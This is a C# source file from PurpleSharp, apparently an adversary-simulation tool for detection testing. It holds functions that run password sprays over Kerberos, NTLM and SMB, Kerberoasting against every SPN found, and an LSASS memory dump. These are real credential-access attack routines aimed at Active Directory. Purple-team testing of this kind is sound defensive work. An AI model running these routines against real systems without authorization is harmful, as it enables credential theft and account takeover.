using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace PurpleSharp.Simulations
{
    public class CredAccess
    {

        public static void LocalDomainPasswordSpray(int usertype, int nuser, int protocol, int sleep, string password, string log)
        {

            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.TimestampInfo(String.Format("Starting T1110 Simulation on {0}", Environment.MachineName));
            logger.TimestampInfo(String.Format("Simulation agent running as {0} with PID:{1}", System.Reflection.Assembly.GetEntryAssembly().Location, Process.GetCurrentProcess().Id));
            logger.TimestampInfo(String.Format("Local Domain Brute Force"));
            bool Kerberos = new bool();
            try
            {
                List<User> usertargets = Lib.Targets.GetUserTargets(usertype, nuser);
                switch (protocol)
                {
                    case 1:
                        Kerberos = true;
                        break;

                    case 2:
                        Kerberos = false;
                        break;

                    default:
                        return;
                }
                //Console.WriteLine("[*] Obtained {0} user accounts", usertargets.Count);
                logger.TimestampInfo(String.Format("Obtained {0} user accounts", usertargets.Count));
                String domain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
                if (usertype == 7) domain = ".";
                //Console.WriteLine("[*] Starting Domain Password Spray Attack on {0}", Environment.MachineName);
                if (sleep > 0) Console.WriteLine("[*] Sleeping {0} seconds between attempt", sleep);
                foreach (var user in usertargets)
                {
                    if (Kerberos)
                    {

                        CredAccessHelper.LogonUser(user.UserName, domain, password, 2, 0, logger);
                        if (sleep > 0) Thread.Sleep(sleep * 1000);
                    }
                    else
                    {
                        CredAccessHelper.LogonUser(user.UserName, domain, password, 2, 2, logger);
                        if (sleep > 0) Thread.Sleep(sleep * 1000);
                    }
                }
                logger.SimulationFinished();
            }
            catch (Exception ex)
            {
                //logger.TimestampInfo(ex.ToString());
                logger.SimulationFailed();
            }

        }

        public static void RemotePasswordSpray(int type, int computertype, int nhost, int usertype, int nuser, int protocol, int sleep, string password, string log)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.TimestampInfo(String.Format("Starting T1110 Simulation on {0}", Environment.MachineName));
            logger.TimestampInfo(String.Format("Simulation agent running as {0} with PID:{1}", System.Reflection.Assembly.GetEntryAssembly().Location, Process.GetCurrentProcess().Id));
            logger.TimestampInfo(String.Format("Remote Domain Brute Force"));
            bool Kerberos = new bool();
            List<Computer> targets = new List<Computer>();
            List<User> targetusers = new List<User>();
            List<Task> tasklist = new List<Task>();
            string  domain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
            if (usertype == 4) domain = ".";
            try
            {
                targets = Lib.Targets.GetHostTargets(computertype, nhost);
                logger.TimestampInfo(String.Format("Obtained {0} target computers", targets.Count));
                targetusers = Lib.Targets.GetUserTargets(usertype, nuser);
                logger.TimestampInfo(String.Format("Obtained {0} target user accounts", targetusers.Count));
                switch (protocol)
                {
                    case 1:
                        Kerberos = true;
                        break;

                    case 2:
                        Kerberos = false;
                        break;

                    default:
                        return;
                }
                //Console.WriteLine("[*] Starting Domain Password Spray Attack from {0}", Environment.MachineName);
                
                if (sleep > 0) Console.WriteLine("[*] Sleeping {0} seconds between attempt", sleep);

                if (type == 1)
                {
                    Kerberos = false;
                    var random = new Random();
                    int index = random.Next(targets.Count);
                    logger.TimestampInfo(String.Format("Picking {0} as a target", targets[index].ComputerName));
                    foreach (User user in targetusers)
                    {

                        
                        User tempuser = user;
                        int tempindex = index;
                        if (sleep > 0 && tempindex > 0) Thread.Sleep(sleep * 1000);
                        
                        tasklist.Add(Task.Factory.StartNew(() =>
                        {
                            CredAccessHelper.RemoteSmbLogin(targets[tempindex], domain, tempuser.UserName, password, Kerberos, logger);
                        }));

                    }
                    Task.WaitAll(tasklist.ToArray());

                }
                else if (type == 2)
                {
                    Kerberos = false;
                    int loops;
                    if (targetusers.Count >= targets.Count) loops = targets.Count;
                    else loops = targetusers.Count;

                    for (int i = 0; i < loops; i++)
                    {
                        int temp = i;
                        if (sleep > 0 && temp > 0) Thread.Sleep(sleep * 1000);
                        tasklist.Add(Task.Factory.StartNew(() =>
                        {
                            CredAccessHelper.RemoteSmbLogin(targets[temp], domain, targetusers[temp].UserName, password, Kerberos, logger);

                        }));
                    }
                    Task.WaitAll(tasklist.ToArray());

                }
                logger.SimulationFinished();
            }
            catch (Exception ex)
            {
                logger.SimulationFailed();
            }
        }

        public static void Kerberoasting(string log, int sleep = 0)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.TimestampInfo(String.Format("Starting T1208 Simulation on {0}", Environment.MachineName));
            logger.TimestampInfo(String.Format("Simulation agent running as {0} with PID:{1}", System.Reflection.Assembly.GetEntryAssembly().Location, Process.GetCurrentProcess().Id));
            if (sleep > 0) Console.WriteLine("[*] Sleeping {0} seconds between attempt", sleep);

            try
            {
                //NetworkCredential cred = null;
                List<String> spns;
                spns = Ldap.GetSPNs();

                foreach (String spn in spns)
                {
                    Lib.SharpRoast.GetDomainSPNTicket(spn.Split('#')[0], spn.Split('#')[1], "", "", logger);
                    if (sleep > 0) Thread.Sleep(sleep * 1000);
                }
                logger.SimulationFinished();

            }
            catch (Exception ex)
            {
                logger.SimulationFailed();
                //logger.TimestampInfo(ex.Message.ToString());
            }


        }

        public static void Lsass(string log, int type = 0)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.TimestampInfo(String.Format("Starting T1003 Simulation on {0}", Environment.MachineName));
            logger.TimestampInfo(String.Format("Simulation agent running as {0} with PID:{1}", System.Reflection.Assembly.GetEntryAssembly().Location, Process.GetCurrentProcess().Id));

            try
            {
                CredAccessHelper.LsassMemoryDump(logger);
                logger.SimulationFinished();
            }
            catch
            {
                logger.SimulationFailed();
            }
            
        }

    }
}

